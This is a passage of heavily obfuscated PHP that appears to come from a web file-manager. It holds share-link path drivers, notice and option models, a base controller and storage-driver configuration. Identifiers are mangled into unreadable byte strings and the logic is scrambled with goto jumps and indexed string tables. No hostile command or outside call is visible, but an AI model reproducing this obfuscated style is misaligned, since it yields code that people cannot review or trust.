IO::info($this->pathParse[$bš¯§©ï¯[86]]); if (!$f¸¥¿ÆÕÅŒ) { return array(); } goto AˆÑ„¢‡áØ; F²ÒÃÖô¦¿: foreach ($bº‹çÛ–‡ as &$fÏÚÒˆ§¼°) { check_abort(); $fÏÚÒˆ§¼°[$bš¯§©ï¯[95]] = $A¾¿¦…îŠ¿->_shareItemeParse($fÏÚÒˆ§¼°[$bš¯§©ï¯[95]], $Cììö£Œ“); } unset($fÏÚÒˆ§¼°); return $bº‹çÛ–‡; goto C‹’İ££“÷; C‹’İ££“÷: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($D¥¿¤ºææÁ) { $this->pathParse = $D¥¿¤ºææÁ; $this->model = Model($_SERVER[œÕÊİğö][1228]); } protected function infoParse($bìƒœ÷ôÒè, $aêöŒºîŒ™ = false, $B‘ÉßÓô‡ = false) { $C«Ñ›šÀÙ =& $_SERVER[œÕÊİğö]; return Action($C«Ñ›šÀÙ[1092])->sharePathInfo($this->pathParse[$C«Ñ›šÀÙ[86]], !0); } public function listPath($bŒÇã«Î¦, $cùŞ”Üå¡é = false) { $A¿Ñ‡†ôò =& $_SERVER[œÕÊİğö]; $Cªøå˜÷ĞÔ = parent::listPath($bŒÇã«Î¦, $cùŞ”Üå¡é); foreach ($Cªøå˜÷ĞÔ as $e˜Óööğê => $DñæéËîİ) { if (!in_array($e˜Óööğê, array($A¿Ñ‡†ôò[84], $A¿Ñ‡†ôò[85]))) { continue; } foreach ($DñæéËîİ as $a¾‰•ÛÌÃ© => $eÕƒÖÊ¬ÏÃ) { $Cªøå˜÷ĞÔ[$e˜Óööğê][$a¾‰•ÛÌÃ©] = Action($A¿Ñ‡†ôò[1092])->shareItemInfo($eÕƒÖÊ¬ÏÃ); } } return $Cªøå˜÷ĞÔ; } public function listAll($EõÃŠ·‚æ™) { goto b¤•‰Áà»‹; cê‚æ¼ê†ª: $d‘ò†ÅË‰œ = $this->model->listAll($EõÃŠ·‚æ™); foreach ($d‘ò†ÅË‰œ as &$dáòé‚‚µÕ) { $dáòé‚‚µÕ[$fĞ° àËŠ©[95]] = Action($fĞ° àËŠ©[1092])->shareItemInfo($dáòé‚‚µÕ[$fĞ° àËŠ©[95]]); } unset($dáòé‚‚µÕ); goto eÏÓ‰ğîƒ; eÏÓ‰ğîƒ: return $d‘ò†ÅË‰œ; goto a·ƒ®éê­; b¤•‰Áà»‹: $fĞ° àËŠ© =& $_SERVER[œÕÊİğö]; $EøšÈæ¯¼¯ = IO::info($this->pathParse[$fĞ° àËŠ©[86]]); if (!$EøšÈæ¯¼¯) { return array(); } goto cê‚æ¼ê†ª; a·ƒ®éê­: } } class PathDriverDriverShareItem { public function __construct($a È›”‰Ú) { $this->pathParse = $a È›”‰Ú; } public function __call($b§ºä©¸©, $B­ïŞÙ¡Š) { $d²óÁÖäå =& $_SERVER[œÕÊİğö]; if (method_exists($this, $b§ºä©¸©)) { return; } $Eê¼Í­Œœ = call_user_func_array(array($d²óÁÖäå[1237], $b§ºä©¸©), $B­ïŞÙ¡Š); $C’³ÍèÅ³ = array($d²óÁÖäå[1238], $d²óÁÖäå[1239], $d²óÁÖäå[1240], $d²óÁÖäå[1241], $d²óÁÖäå[552], $d²óÁÖäå[554], $d²óÁÖäå[1242], $d²óÁÖäå[117], $d²óÁÖäå[1243], $d²óÁÖäå[1244]); if (in_array($b§ºä©¸©, $C’³ÍèÅ³)) { $Eê¼Í­Œœ = $this->getPathOuter($Eê¼Í­Œœ); } return $Eê¼Í­Œœ; } public function copy($cÄ¡ÏÕĞİâ, $D‚ù”ÀÚÀ, $côÔ‰¦ÌÙâ = false) { return $this->copyMove($cÄ¡ÏÕĞİâ, $D‚ù”ÀÚÀ, $côÔ‰¦ÌÙâ, $_SERVER[œÕÊİğö][552]); } public function move($DÒÁçêÅ‘, $f¸ÏÆòâ±, $C´Ÿœ­ª  = false) { return $this->copyMove($DÒÁçêÅ‘, $f¸ÏÆòâ±, $C´Ÿœ­ª , $_SERVER[œÕÊİğö][554]); } private function copyMove($eğ‘ŸÆ‰›Í, $dÔŸ®éˆƒ, $F§œäÄÁã, $bİŸÀ²›‰ƒ) { goto AæÅØß©—ã; BšÇÏºª®Ê: if ($cŒÖÀà ¨->pathParse[$E—ÈÆ•ãÉï[1070]]) { $dÔŸ®éˆƒ = $cŒÖÀà ¨->pathParse[$E—ÈÆ•ãÉï[1070]]; } else { $dÔŸ®éˆƒ = $Aôƒõè·²œ; } $e§‚Ç‰í£Ú = IO::copyMove($eğ‘ŸÆ‰›Í, $dÔŸ®éˆƒ, $F§œäÄÁã, $bİŸÀ²›‰ƒ); $e§‚Ç‰í£Ú = $this->getPathOuter($e§‚Ç‰í£Ú); goto aÂš½Ôğ“²; aÂš½Ôğ“²: return $e§‚Ç‰í£Ú; goto EÍù—ì¸; AæÅØß©—ã: $E—ÈÆ•ãÉï =& $_SERVER[œÕÊİğö]; $Aôƒõè·²œ = $dÔŸ®éˆƒ; $cŒÖÀà ¨ = IO::driverMake($dÔŸ®éˆƒ); goto BšÇÏºª®Ê; EÍù—ì¸: } public function pathThis($a–ÅÊÚ¿æ”) { return get_path_this($this->pathParse[$_SERVER[œÕÊİğö][86]]); } public function pathFather($AÁåÕ¾Ñ) { return get_path_father($this->pathParse[$_SERVER[œÕÊİğö][86]]); } public function iconvSystem($f¹…“Ì†Ÿ) { return $f¹…“Ì†Ÿ; } protected function infoParse($Dä‹³ä¥Ç, $Aœíµö½ø„ = false) { $A¨íğøŒ‚ =& $_SERVER[œÕÊİğö]; $dàƒĞßÁà = $this->pathParse[$A¨íğøŒ‚[489]][$A¨íğøŒ‚[1093]] . $this->pathParse[$A¨íğøŒ‚[1086]]; if ($Aœíµö½ø„) { $Eô‘ç¿ïá = IO::infoWithChildren($dàƒĞßÁà); } else { $Eô‘ç¿ïá = IO::info($dàƒĞßÁà); } $f÷½¼ö˜†‹ = $this->pathParse[$A¨íğøŒ‚[489]]; return Action($A¨íğøŒ‚[1236])->_shareItemeParse($Eô‘ç¿ïá, $f÷½¼ö˜†‹); } public function listAll($cÛòßà¾ä) { $dó—ãª¬Äô =& $_SERVER[œÕÊİğö]; $EÎ¶¾ôåˆˆ = IO::listAll($cÛòßà¾ä); $aâé°Ş•ò = $this->pathParse[$dó—ãª¬Äô[489]]; foreach ($EÎ¶¾ôåˆˆ as &$FÖ®Ÿßà°¾) { check_abort(); $dÚÎ‡¦ãÑ¿ = IO::info($FÖ®Ÿßà°¾[$dó—ãª¬Äô[86]]); $dÚÎ‡¦ãÑ¿ = is_array($dÚÎ‡¦ãÑ¿) ? $dÚÎ‡¦ãÑ¿ : array(); $FÖ®Ÿßà°¾ = array_merge($dÚÎ‡¦ãÑ¿, $FÖ®Ÿßà°¾); $FÖ®Ÿßà°¾[$dó—ãª¬Äô[95]] = Action($dó—ãª¬Äô[1236])->_shareItemeParse($FÖ®Ÿßà°¾, $aâé°Ş•ò); } unset($FÖ®Ÿßà°¾); return $EÎ¶¾ôåˆˆ; } public function getPathOuter($Fé÷®»†ØÒ) { goto E©ŒÂîæ»È; E©ŒÂîæ»È: $Eš‘Ÿ§´ =& $_SERVER[œÕÊİğö]; $eæ†åÔ˜¸ƒ = KodIO::parse($Fé÷®»†ØÒ); if ($eæ†åÔ˜¸ƒ[$Eš‘Ÿ§´[39]] == KodIO::KOD_SHARE_ITEM) { return $eæ†åÔ˜¸ƒ[$Eš‘Ÿ§´[86]]; } goto CÙ¿Ù œˆ; CÙ¿Ù œˆ: $eÆáà èÓÔ = KodIO::clear($Fé÷®»†ØÒ); $fìç”½Û™ = KodIO::clear($this->pathParse[$Eš‘Ÿ§´[489]][$Eš‘Ÿ§´[1093]]); $d¡©îñĞ÷â = substr($eÆáà èÓÔ, strlen($fìç”½Û™)); goto dİáÒ„«·â; dİáÒ„«·â: if (substr($eÆáà èÓÔ, 0, strlen($fìç”½Û™)) != $fìç”½Û™) { return !1; } return $this->pathParse[$Eš‘Ÿ§´[1087]] . $Eš‘Ÿ§´[8] . ltrim($d¡©îñĞ÷â, $Eš‘Ÿ§´[8]); goto d†ß¢ßÑ÷; d†ß¢ßÑ÷: } public function getType() { $f”ÂõÊÆÉ£ =& $_SERVER[œÕÊİğö]; $d¡…Û·°É = str_replace($f”ÂõÊÆÉ£[82], $f”ÂõÊÆÉ£[43], get_class($this)); return strtolower($d¡…Û·°É); } public function isTypeObject($bé†¥óÜŠŒ) { return IO::isTypeObject($bé†¥óÜŠŒ); } public function info($eÉ¯ËÃè®¦) { return $this->infoParse($eÉ¯ËÃè®¦); } public function infoAuth($d½®°±ƒÒ“) { return $this->infoParse($d½®°±ƒÒ“); } public function infoWithChildren($aÎÏÔ½šÂ„) { return $this->infoParse($aÎÏÔ½šÂ„, !0); } public function infoFull($C³•×ğÛÄ¸) { return $this->infoParse($C³•×ğÛÄ¸); } } goto dÑÄ¼“ ÖÑ; dğÇî¹ªíİ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\156\x6f\164\151\x63\145\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\x63\x6f\156\164\145\x6e\164", "\x61\165\x74\150", "\155\x6f\x64\x65", "\x74\151\155\145", "\x74\171\160\x65", "\x6c\x65\x76\145\154", "\145\x6e\141\142\x6c\145", "\163\157\x72\x74"); public function listData($bÜƒˆ‡Ò = false, $DàŸÁë›ĞÒ = "\163\157\162\164", $bæÌğ…á·¯ = false) { return parent::listData($bÜƒˆ‡Ò, $DàŸÁë›ĞÒ, $bæÌğ…á·¯); } public function add($dêÇÈñò»º) { $e…˜ˆáŒáª =& $_SERVER[œÕÊİğö]; $cµ¡·“¯Ø = time(); if ($dêÇÈñò»º[$e…˜ˆáŒáª[22]] == $e…˜ˆáŒáª[2130]) { $cµ¡·“¯Ø = strtotime($dêÇÈñò»º[$e…˜ˆáŒáª[207]]); } $dêÇÈñò»º[$e…˜ˆáŒáª[207]] = $cµ¡·“¯Ø; return parent::insert($dêÇÈñò»º); } public function update($a°»Ï¸Ç–æ, $BË¦ÁîôÙ—) { goto EóŒèÀÛÍ—; d¸Ç¾Éëò: return parent::update($a°»Ï¸Ç–æ, $BË¦ÁîôÙ—); goto E‡‚°Û¥óó; EóŒèÀÛÍ—: $D§‡ïÃöŸÔ =& $_SERVER[œÕÊİğö]; $cõ·¬°†Øç = $this->listData($a°»Ï¸Ç–æ); if (!$cõ·¬°†Øç) { return !1; } goto F¢°çÂ¸ö; F¢°çÂ¸ö: $eù¢¤ãéÙğ = time(); if ($BË¦ÁîôÙ—[$D§‡ïÃöŸÔ[22]] == $D§‡ïÃöŸÔ[2130]) { $eù¢¤ãéÙğ = strtotime($BË¦ÁîôÙ—[$D§‡ïÃöŸÔ[207]]); } $BË¦ÁîôÙ—[$D§‡ïÃöŸÔ[207]] = $eù¢¤ãéÙğ; goto d¸Ç¾Éëò; E‡‚°Û¥óó: } public function remove($AÑŸÜÊ½Ä­) { $A’ö°Œ¸í = $this->listData($AÑŸÜÊ½Ä­); if (!$A’ö°Œ¸í || $A’ö°Œ¸í[$_SERVER[œÕÊİğö][1193]]) { return !1; } return parent::remove($AÑŸÜÊ½Ä­); } public function sort($FÖ¨¥ö«¼, $cóˆÉ¥è•ª) { return parent::update($FÖ¨¥ö«¼, $cóˆÉ¥è•ª); } public function enable($e’¶á°ì™§, $eØ–¼¤å·Ú) { return parent::update($e’¶á°ì™§, array($_SERVER[œÕÊİğö][2131] => $eØ–¼¤å·Ú)); } private function initUserOption() { $aœìƒÑÏ‘œ =& $_SERVER[œÕÊİğö]; $this->optionType = $aœìƒÑÏ‘œ[2132]; $this->modelType = $aœìƒÑÏ‘œ[2133]; $this->field = array($aœìƒÑÏ‘œ[2134], $aœìƒÑÏ‘œ[38], $aœìƒÑÏ‘œ[207], $aœìƒÑÏ‘œ[39], $aœìƒÑÏ‘œ[2135], $aœìƒÑÏ‘œ[740], $aœìƒÑÏ‘œ[199]); } public function userNoticeGet($E³Úµèè¿ = false) { $this->initUserOption(); return parent::listData($E³Úµèè¿, $_SERVER[œÕÊİğö][404], !0); } public function userNoticeAdd($A´«µÉß£†) { $bœêŸÄšÑó =& $_SERVER[œÕÊİğö]; $this->initUserOption(); $fêªôÙ“½ = $this->findByKey($bœêŸÄšÑó[2134], $A´«µÉß£†[$bœêŸÄšÑó[404]]); if ($fêªôÙ“½) { return !0; } $Eˆ×ËèÖŒ = array($bœêŸÄšÑó[2134] => $A´«µÉß£†[$bœêŸÄšÑó[404]], $bœêŸÄšÑó[38] => $A´«µÉß£†[$bœêŸÄšÑó[38]], $bœêŸÄšÑó[207] => $A´«µÉß£†[$bœêŸÄšÑó[207]], $bœêŸÄšÑó[39] => isset($A´«µÉß£†[$bœêŸÄšÑó[39]]) ? $A´«µÉß£†[$bœêŸÄšÑó[39]] : 1, $bœêŸÄšÑó[2135] => isset($A´«µÉß£†[$bœêŸÄšÑó[2135]]) ? $A´«µÉß£†[$bœêŸÄšÑó[2135]] : 0, $bœêŸÄšÑó[740] => 0, $bœêŸÄšÑó[199] => 0); return parent::insert($Eˆ×ËèÖŒ); } public function userNoticeEdit($c›Îï¦äæ‘, $BÒ®³›¨À) { $this->initUserOption(); return parent::update($c›Îï¦äæ‘, $BÒ®³›¨À); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\x65\x6d\x5f\157\160\x74\x69\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\x75", "\x72\157\154\145", "\x72\x6f\154\145\x47\x72\157\x75\160", "\x72\145\147\151\163\x74", "\145\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($dí¹•Ø²¤ô) { return "\x53\x79\x73\x74\x65\x6d\x4f\x70\164\151\x6f\156\x5f{$dí¹•Ø²¤ô}"; } protected function optionDefault($eŞØôÙ¼³‘ = '') { $DÊ¸šÜ—Û„ =& $_SERVER[œÕÊİğö]; if ($eŞØôÙ¼³‘ == $DÊ¸šÜ—Û„[43]) { return $GLOBALS[$DÊ¸šÜ—Û„[6]][$DÊ¸šÜ—Û„[388]]; } } } class SystemRecordModel extends ModelBaseLight { } goto Eƒ¬ÅÙ“Ë; cİğóÏé“: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto e‡íÇÄÑİÌ; fŞŸèèìøÈ: $this->in =& $in; $this->values[$a…ä‰â“øì[6]] =& $config; $this->values[$a…ä‰â“øì[7]] =& $in; goto DœÉ®ˆ£Š; DœÉ®ˆ£Š: $this->tpl = TEMPLATE . MOD . $a…ä‰â“øì[8]; $this->_classObjectID = mt_rand(0, 10000); goto b«£‰Œ¿á¼; e‡íÇÄÑİÌ: $a…ä‰â“øì =& $_SERVER[œÕÊİğö]; global $in, $config; $this->config =& $config; goto fŞŸèèìøÈ; b«£‰Œ¿á¼: } public function loadClass($cÅ‘¸áÒÜÓ) { if (1 === func_num_args()) { $this->{$cÅ‘¸áÒÜÓ} = new $cÅ‘¸áÒÜÓ(); } else { $C—…‘Ä£ = new ReflectionClass($cÅ‘¸áÒÜÓ); $b“Ì™Ü¦•‰ = func_get_args(); array_shift($b“Ì™Ü¦•‰); $this->{$cÅ‘¸áÒÜÓ} = $C—…‘Ä£->newInstanceArgs($b“Ì™Ü¦•‰); } return $this->{$cÅ‘¸áÒÜÓ}; } protected function assign($aê’ó¸–äÄ, $cØÊêÃ’Øƒ) { $this->values[$aê’ó¸–äÄ] = $cØÊêÃ’Øƒ; } protected function display($EÑ¬»Ÿ§ «) { ob_end_clean(); extract($this->values); require $this->tpl . $EÑ¬»Ÿ§ «; } } $B‹’ó¬¬¾  = $_SERVER[$_SERVER[œÕÊİğö][9]]; $D’ø¤–Ÿ¶© = $_SERVER[œÕÊİğö][10]; goto f‘±‘®åñğ; aé°…â“¾: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\163\x74\157\x72\x61\x67\x65\114\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\x73\151\x7a\x65\x4d\141\x78", "\x73\x79\x73\x74\145\155", "\x64\x65\146\141\165\154\164", "\144\162\x69\x76\145\x72", "\x63\157\156\x66\x69\x67"); public function listData($aƒÅùÔÜŸõ = false, $dª´´²¾† = "\155\x6f\x64\x69\x66\171\x54\151\155\145", $a–ç©¼ÖÍ = false) { $bŞ½Ô®¸Œñ =& $_SERVER[œÕÊİğö]; $Cí²Œ©£‰‚ = parent::listData($aƒÅùÔÜŸõ, $dª´´²¾†, $a–ç©¼ÖÍ); if ($aƒÅùÔÜŸõ) { return $Cí²Œ©£‰‚; } $CÄÆ¾¡ÕÂ = $this->ioSizeUseGet(array_to_keyvalue($Cí²Œ©£‰‚, $bŞ½Ô®¸Œñ[43], $bŞ½Ô®¸Œñ[404])); foreach ($Cí²Œ©£‰‚ as $eêİã¯ => $AœÊ·ˆÓĞ) { unset($Cí²Œ©£‰‚[$eêİã¯][$bŞ½Ô®¸Œñ[6]]); $Cí²Œ©£‰‚[$eêİã¯][$bŞ½Ô®¸Œñ[1706]] = isset($CÄÆ¾¡ÕÂ[$AœÊ·ˆÓĞ[$bŞ½Ô®¸Œñ[404]]]) ? $CÄÆ¾¡ÕÂ[$AœÊ·ˆÓĞ[$bŞ½Ô®¸Œñ[404]]] : 0; } return $Cí²Œ©£‰‚; } public function ioSizeUseGet($FÈÁ¡‹½´) { goto bÀÙš÷ µ; aĞÜáß­ø: Cache::set($D­Œá½ŒÌ‰, $cÙ³ò®ëÈ, 600); return $cÙ³ò®ëÈ; goto bÂŒ›“…–—; eªè›ŠÇ: $Bíº™ ¿×‡ = array($FÈµ†èÀ[814] => array($FÈµ†èÀ[7], $FÈÁ¡‹½´)); $cÙ³ò®ëÈ = Model($FÈµ†èÀ[777])->field($C¯´‰é¼„)->where($Bíº™ ¿×‡)->group($FÈµ†èÀ[814])->select(); $cÙ³ò®ëÈ = array_to_keyvalue($cÙ³ò®ëÈ, $FÈµ†èÀ[404], $FÈµ†èÀ[88]); goto aĞÜáß­ø; bÀÙš÷ µ: $FÈµ†èÀ =& $_SERVER[œÕÊİğö]; if (!$FÈÁ¡‹½´) { return array(); } $D­Œá½ŒÌ‰ = $FÈµ†èÀ[2020] . implode($FÈµ†èÀ[57], $FÈÁ¡‹½´); goto Døƒèô‡Ì•; Døƒèô‡Ì•: $cÙ³ò®ëÈ = Cache::get($D­Œá½ŒÌ‰); if ($cÙ³ò®ëÈ) { return $cÙ³ò®ëÈ; } $C¯´‰é¼„ = array($FÈµ†èÀ[814] => $FÈµ†èÀ[404], $FÈµ†èÀ[2021] => $FÈµ†èÀ[88]); goto eªè›ŠÇ; bÂŒ›“…–—: } public function getConfig($FÎÚ‰–¡) { $B×ÖÑš¶ò = parent::listData($FÎÚ‰–¡); return json_decode($B×ÖÑš¶ò[$_SERVER[œÕÊİğö][6]], !0); } public function update($aŸœá¥†´ù, $AÏ¢Îøğ’ø) { goto bî®ªöãê‘; F“å£ã¥Ô: $bÆõÀÚ³œ = parent::update($aŸœá¥†´ù, $AÏ¢Îøğ’ø); if ($bÆõÀÚ³œ && $AÏ¢Îøğ’ø[$D¨Í‚¦×Ş[44]]) { foreach ($d«ò§Á…š„ as $Dƒ¦Ü¯ë) { if ($Dƒ¦Ü¯ë[$D¨Í‚¦×Ş[44]] && $Dƒ¦Ü¯ë[$D¨Í‚¦×Ş[404]] != $aŸœá¥†´ù) { parent::update($Dƒ¦Ü¯ë[$D¨Í‚¦×Ş[404]], array($D¨Í‚¦×Ş[44] => 0)); } } } return $bÆõÀÚ³œ; goto a¶¯–œí·Ü; bî®ªöãê‘: $D¨Í‚¦×Ş =& $_SERVER[œÕÊİğö]; $Bãæ²°òİ = $AÏ¢Îøğ’ø[$D¨Í‚¦×Ş[38]]; $d«ò§Á…š„ = array_to_keyvalue(parent::listData(), $D¨Í‚¦×Ş[38]); goto cÊßØÈßÁ‰; cÊßØÈßÁ‰: if (isset($d«ò§Á…š„[$Bãæ²°òİ]) && $d«ò§Á…š„[$Bãæ²°òİ][$D¨Í‚¦×Ş[404]] != $aŸœá¥†´ù) { return !1; } if (isset($AÏ¢Îøğ’ø[$D¨Í‚¦×Ş[2022]]) && $AÏ¢Îøğ’ø[$D¨Í‚¦×Ş[2022]] == $D¨Í‚¦×Ş[97]) { $this->checkConfig($AÏ¢Îøğ’ø); } unset($AÏ¢Îøğ’ø[$D¨Í‚¦×Ş[2022]]); goto F“å£ã¥Ô; a¶¯–œí·Ü: } public function add($aöÅ¡Ø„…) { goto e·Å¨ßÖ; Dõ„ÀæËö›: $this->checkConfig($aöÅ¡Ø„…); $DÉ¯¡«ÚĞ = parent::insert($aöÅ¡Ø„…); if ($DÉ¯¡«ÚĞ && $aöÅ¡Ø„…[$E£Ô‚Ùë¡[44]]) { foreach ($FÁêëËó‰æ as $c“ÖÊç¥ñÖ) { if ($c“ÖÊç¥ñÖ[$E£Ô‚Ùë¡[44]]) { parent::update($c“ÖÊç¥ñÖ[$E£Ô‚Ùë¡[404]], array($E£Ô‚Ùë¡[44] => 0)); } } } goto b¨¼›‘óéø; e·Å¨ßÖ: $E£Ô‚Ùë¡ =& $_SERVER[œÕÊİğö]; $FÁêëËó‰æ = array_to_keyvalue(parent::listData(), $E£Ô‚Ùë¡[38]); if (isset($FÁêëËó‰æ[$aöÅ¡Ø„…[$E£Ô‚Ùë¡[38]]])) { return !1; } goto Dõ„ÀæËö›; b¨¼›‘óéø: return $DÉ¯¡«ÚĞ; goto B¨¼ªêªÂ°; B¨¼ªêªÂ°: } public function checkConfig(&$FŠ±ãÄÁñŞ, $F™ëÇñÙ¹Á = false) { goto AôÚÆ˜¤Ó‘; c‘Æ¡ç‚: $eƒ¦âÏ…‰‡ = $bƒ˜ŸïĞñ->getPath($d±èÊ¹çİ . $f¾…×ªŸ’Õ[1160]); if (!$bƒ˜ŸïĞñ->mkfile($eƒ¦âÏ…‰‡)) { if ($F™ëÇñÙ¹Á) { return LNG($f¾…×ªŸ’Õ[2027]); } show_json(LNG($f¾…×ªŸ’Õ[2027]), !1); } $Cê¦º¦¶†ê[$f¾…×ªŸ’Õ[1098]] = $d±èÊ¹çİ; goto e³‹å–¿õÆ; e³‹å–¿õÆ: $FŠ±ãÄÁñŞ[$f¾…×ªŸ’Õ[6]] = json_encode($Cê¦º¦¶†ê); $FŠ±ãÄÁñŞ[$f¾…×ªŸ’Õ[104]] = $BÊÅ¨Ö›”è; return !0; goto Aä›ŠÓê°; C¸¹‡†Æ»: $BÊÅ¨Ö›”è = isset($Bµâ¶¶Œ¿[$aÔ’Ô½Ã²ƒ]) ? $Bµâ¶¶Œ¿[$aÔ’Ô½Ã²ƒ] : ucfirst($aÔ’Ô½Ã²ƒ); $eëì¯ÅõÄØ = $f¾…×ªŸ’Õ[82] . $BÊÅ¨Ö›”è; if (!$BÊÅ¨Ö›”è || !class_exists($eëì¯ÅõÄØ)) { if ($F™ëÇñÙ¹Á) { return LNG($f¾…×ªŸ’Õ[2024]); } write_log(array($f¾…×ªŸ’Õ[2025], $FŠ±ãÄÁñŞ, get_caller_info()), $f¾…×ªŸ’Õ[2026]); show_json(LNG($f¾…×ªŸ’Õ[2024]), !1, $FŠ±ãÄÁñŞ); } goto D§ÁÏ´ÔŠ; D§ÁÏ´ÔŠ: $bƒ˜ŸïĞñ = new $eëì¯ÅõÄØ($Cê¦º¦¶†ê); if (in_array($aÔ’Ô½Ã²ƒ, $bƒ˜ŸïĞñ->objectDriver)) { if (!$bƒ˜ŸïĞñ->isBucketCors() && !$bƒ˜ŸïĞñ->setBucketCors()) { $B›Úù¥ç”Œ = LNG($f¾…×ªŸ’Õ[2027]); $B›Úù¥ç”Œ .= $f¾…×ªŸ’Õ[2028] . LNG($f¾…×ªŸ’Õ[2029]); if ($F™ëÇñÙ¹Á) { return $B›Úù¥ç”Œ; } show_json($B›Úù¥ç”Œ, !1); } } $d±èÊ¹çİ = rtrim($Cê¦º¦¶†ê[$f¾…×ªŸ’Õ[1098]], $f¾…×ªŸ’Õ[8]) . $f¾…×ªŸ’Õ[8]; goto c‘Æ¡ç‚; BÁ¿Áğ¢²ó: foreach ($Cê¦º¦¶†ê as $a‹‡–²©˜† => $fò®œ‚£¬Ç) { $Cê¦º¦¶†ê[$a‹‡–²©˜†] = trim($fò®œ‚£¬Ç); } $Cê¦º¦¶†ê[$f¾…×ªŸ’Õ[2023]] = rand_string(6); $Bµâ¶¶Œ¿ = $GLOBALS[$f¾…×ªŸ’Õ[6]][$f¾…×ªŸ’Õ[98]][$f¾…×ªŸ’Õ[823]]; goto C¸¹‡†Æ»; AôÚÆ˜¤Ó‘: $f¾…×ªŸ’Õ =& $_SERVER[œÕÊİğö]; $aÔ’Ô½Ã²ƒ = strtolower($FŠ±ãÄÁñŞ[$f¾…×ªŸ’Õ[104]]); $Cê¦º¦¶†ê = json_decode($FŠ±ãÄÁñŞ[$f¾…×ªŸ’Õ[6]], !0); goto BÁ¿Áğ¢²ó; Aä›ŠÓê°: } public function driverListSystem() { $BŞã³ö”İŠ =& $_SERVER[œÕÊİğö]; $E«Ç¶ø˜Í¦ = parent::listData(); $C‚¥Ó‘¾¼ = array(); foreach ($E«Ç¶ø˜Í¦ as $DòÊ¶Ü…Â) { unset($DòÊ¶Ü…Â[$BŞã³ö”İŠ[204]], $DòÊ¶Ü…Â[$BŞã³ö”İŠ[94]]); $DòÊ¶Ü…Â[$BŞã³ö”İŠ[6]] = json_decode($DòÊ¶Ü…Â[$BŞã³ö”İŠ[6]], !0); $C‚¥Ó‘¾¼[] = $DòÊ¶Ü…Â; } return $C‚¥Ó‘¾¼; } public function defaultDriver() { $AïÍ¤©Ï‚ =& $_SERVER[œÕÊİğö]; $CˆØÈ’‹Ì¿ = parent::listData(); $FöÎ£öºÈà = array_filter_by_field($CˆØÈ’‹Ì¿, $AïÍ¤©Ï‚[44], 1); $FöÎ£öºÈà = $FöÎ£öºÈà[0]; if ($FöÎ£öºÈà) { $FöÎ£öºÈà[$AïÍ¤©Ï‚[6]] = json_decode($FöÎ£öºÈà[$AïÍ¤©Ï‚[6]], !0); } return $FöÎ£öºÈà; } public function driverInfo($bä„”õ²Ì©) { $EÄÌÅ•ÙÉ =& $_SERVER[œÕÊİğö]; $C˜Œ…ˆ„„¹ = array_to_keyvalue(parent::listData(), $EÄÌÅ•ÙÉ[404]); if (!isset($C˜Œ…ˆ„„¹[$bä„”õ²Ì©])) { return !1; } $Bãí†º‘Õ‡ = $C˜Œ…ˆ„„¹[$bä„”õ²Ì©]; $Bãí†º‘Õ‡[$EÄÌÅ•ÙÉ[6]] = json_decode($Bãí†º‘Õ‡[$EÄÌÅ•ÙÉ[6]], !0); return $Bãí†º‘Õ‡; } public function remove($e¸‘ÓÁª„¿) { $this->removeShareItems($e¸‘ÓÁª„¿); return parent::remove($e¸‘ÓÁª„¿); } public function removeWithFile($dÙ‚”ªøÊ, $FŠØÓÏ‹á) { goto B˜íœÁèö‡; D‰×¥¡¹à®: if (!$dİ“ë¼¹½Ã) { $B‘‹†íòØá->stop($cÚ¤®Æíñ); return !1; } $B‘‹†íòØá->end(); if ($FŠØÓÏ‹á == $cä¼»¢ÆŸì[1686]) { $this->remove($dÙ‚”ªøÊ); } goto fİ¦¨òö¯¿; F¢Õ²›Ö©: $D‡öš²ÛŠÎ = Model($cä¼»¢ÆŸì[473])->where($eçšòäğå)->sum($cä¼»¢ÆŸì[88]); $cÚ¤®Æíñ = $FŠØÓÏ‹á . $cä¼»¢ÆŸì[2030] . $dÙ‚”ªøÊ; $B‘‹†íòØá = new TaskFileTransfer($cÚ¤®Æíñ, $cä¼»¢ÆŸì[2026], $aÇ…ºâàõ™, LNG($cä¼»¢ÆŸì[2031]) . "\50{$dÙ‚”ªøÊ}\51"); goto aˆ†½‚©ÀÏ; B˜íœÁèö‡: $cä¼»¢ÆŸì =& $_SERVER[œÕÊİğö]; $eçšòäğå = array($cä¼»¢ÆŸì[814] => $dÙ‚”ªøÊ); $aÇ…ºâàõ™ = Model($cä¼»¢ÆŸì[473])->where($eçšòäğå)->count(); goto F¢Õ²›Ö©; bäŠæ¥â: $f¹õ÷‡ö = "\173\151\x6f\x3a{$eÒ¦éÍó†³}\x7d\57"; $dİ“ë¼¹½Ã = !0; $Bƒîøâ–Œ  = array(); goto D³¹ºÅ¯•÷; D³¹ºÅ¯•÷: $D—İí„›“Ü = Model($cä¼»¢ÆŸì[203])->where($eçšòäğå)->field($cä¼»¢ÆŸì[2032])->select(); foreach ($D—İí„›“Ü as $aĞ”«»Ñõê) { goto bì¿½è’¾¯; E¸ùåÍÚÉÎ: if (IO::exist($b‚Ù—ğÙ¿ƒ)) { $B‘‹†íòØá->updateFileEnd($aĞ”«»Ñõê[$cä¼»¢ÆŸì[38]], $aĞ”«»Ñõê[$cä¼»¢ÆŸì[88]]); continue; } if (!IO::move($eÚÃ¼‡æŒø, get_path_father($b‚Ù—ğÙ¿ƒ))) { $dİ“ë¼¹½Ã = !1; break; } $eçšòäğå = array($cä¼»¢ÆŸì[470] => $aĞ”«»Ñõê[$cä¼»¢ÆŸì[470]]); goto cº¤Ïˆˆ; bì¿½è’¾¯: $eÚÃ¼‡æŒø = $aĞ”«»Ñõê[$cä¼»¢ÆŸì[86]]; $b‚Ù—ğÙ¿ƒ = $f¹õ÷‡ö . str_replace("\x7b\151\157\x3a{$dÙ‚”ªøÊ}\x7d\x2f", $cä¼»¢ÆŸì[43], $eÚÃ¼‡æŒø); if (!IO::exist($eÚÃ¼‡æŒø)) { $Bƒîøâ–Œ [] = $aĞ”«»Ñõê[$cä¼»¢ÆŸì[470]]; 